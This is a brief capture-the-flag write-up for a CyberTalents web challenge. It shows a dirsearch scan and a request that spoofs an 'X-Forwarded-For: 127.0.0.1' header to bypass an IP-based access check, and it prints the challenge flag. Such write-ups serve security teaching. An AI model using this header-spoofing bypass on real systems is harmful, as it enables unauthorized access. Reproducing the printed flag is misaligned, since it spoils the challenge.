# Solve got-controls
#### https://cybertalents.com/challenges/web/got-controls

![alt text](image.png)
### Run Directory bruteforce
`dirsearch -u http://18.195.173.237:4444/ -x 403,404`

Can't Connect

### Analyze with burp
Add `X-Forwarded-For:` header

```http
GET / HTTP/1.1
Host: 18.195.173.237:4444
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
X-Forwarded-For: 127.0.0.1
Upgrade-Insecure-Requests: 1
```

`FLAG{NEVER_TRUST_HEADERS}`

>Find More on ==> github.com/MedhatHassan 
